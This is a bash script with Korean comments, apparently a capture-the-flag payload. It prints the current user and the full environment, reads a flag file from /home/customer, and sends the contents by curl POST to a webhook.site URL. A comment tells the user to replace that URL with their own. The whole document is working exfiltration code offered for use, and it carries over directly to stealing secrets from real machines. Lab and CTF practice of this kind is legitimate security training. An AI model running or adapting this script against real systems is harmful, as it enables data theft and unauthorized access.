#!/bin/bash

# 명령어 실행 과정을 모두 출력하도록 설정 (디버깅 목적)
set -x 

echo "[DEBUG] ----------------------------------------"
echo "[DEBUG] Payload execution started!"
echo "[DEBUG] Current Date/Time: $(date)"
echo "[DEBUG] Current User: $(whoami)"
echo "[DEBUG] Current Directory: $(pwd)"
echo "[DEBUG] Environment Variables: "
env | sed 's/^/[DEBUG] ENV: /'
echo "[DEBUG] ----------------------------------------"

FLAG_PATH="/home/customer/flag.txt"
echo "[DEBUG] Attempting to read flag from: $FLAG_PATH"

if [ -f "$FLAG_PATH" ]; then
    echo "[DEBUG] SUCCESS: Flag file found!"
    FLAG_CONTENT=$(cat "$FLAG_PATH")
    echo "[DEBUG] Extracted Flag Content: $FLAG_CONTENT"
    
    echo "[DEBUG] Attempting to exfiltrate data via curl..."
    
    # 주의: 아래 URL을 본인의 Webhook URL(예: webhook.site)이나 
    # 통제 가능한 서버의 주소로 반드시 변경해야 합니다!
    EXFIL_URL="https://webhook.site/0b5feffa-7ca7-4b87-9234-bd921df5cadc"
    
    # curl을 이용해 POST 방식으로 플래그 전송
    curl -X POST -d "flag=$FLAG_CONTENT" "$EXFIL_URL"
    
    CURL_EXIT_CODE=$?
    if [ $CURL_EXIT_CODE -eq 0 ]; then
        echo "[DEBUG] EXFILTRATION SUCCESS: Flag sent to $EXFIL_URL"
    else
        echo "[DEBUG] EXFILTRATION FAILED: curl exited with code $CURL_EXIT_CODE"
    fi
else
    echo "[DEBUG] ERROR: Flag file does not exist at $FLAG_PATH!"
    echo "[DEBUG] Listing files in current directory to help debug:"
    ls -la | sed 's/^/[DEBUG] LS: /'
fi

echo "[DEBUG] Payload execution completed!"
echo "[DEBUG] ----------------------------------------"